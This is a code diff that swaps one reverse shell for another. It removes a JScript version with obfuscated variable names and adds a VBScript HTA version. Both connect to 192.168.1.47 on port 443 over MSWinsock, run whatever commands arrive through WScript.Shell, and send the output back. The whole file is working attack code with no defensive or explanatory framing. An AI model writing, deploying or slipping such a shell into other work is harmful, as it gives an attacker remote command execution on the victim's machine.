@@ -1,31 +1,51 @@
-<!-- reverse_shell.html -->
 <html>
-<script>
-var htaipspkk = '192.168.1.47';
-var oidkoeikoie = 443;
-var ws = new ActiveXObject('WScript.Shell');
-var conn = new ActiveXObject('MSWinsock.Winsock');
-conn.RemoteHost = htaipspkk;
-conn.RemotePort = oidkoeikoie;
-
-conn.Connect();
-
-conn.OnDataArrival = function(bytesTotal) {
-    var command = conn.GetData(8); // 8 = String type
-    try {
-        var output = ws.Exec(command).StdOut.ReadAll();
-        conn.SendData(output);
-    } catch (e) {
-        conn.SendData(e.message);
-    }
-};
-
-conn.OnConnect = function() {
-    conn.SendData("Connected\n");
-};
-
-conn.OnError = function(number, description) {
-    conn.SendData("Error: " + description + "\n");
-};
-</script>
+<head>
+    <hta:application id="app" border="none" />
+    <script language="VBScript">
+        Dim ws, shell, cmd, output, server, port, connection
+        Set ws = CreateObject("WScript.Shell")
+        server = "192.168.1.47"
+        port = 443
+        
+        On Error Resume Next
+        Set connection = CreateObject("MSWinsock.Winsock")
+        connection.RemoteHost = server
+        connection.RemotePort = port
+        connection.Connect
+        
+        Do While connection.Connected <> 1
+            WScript.Sleep 100
+        Loop
+        
+        connection.SendData "Connected to " & server & ":" & port & vbCrLf
+        
+        Do
+            On Error Resume Next
+            WScript.Sleep 100
+            If connection.BytesReceived > 0 Then
+                connection.GetData cmd
+                If cmd = "exit" Then
+                    Exit Do
+                End If
+                
+                Set shell = ws.Exec(cmd)
+                Do Until shell.Status
+                    WScript.Sleep 100
+                Loop
+                
+                output = shell.StdOut.ReadAll
+                If shell.StdErr.AtEndOfStream = False Then
+                    output = output & vbCrLf & "Error: " & shell.StdErr.ReadAll
+                End If
+                
+                connection.SendData output
+            End If
+        Loop
+        
+        connection.Close
+        window.close
+    </script>
+</head>
+<body>
+</body>
 </html>
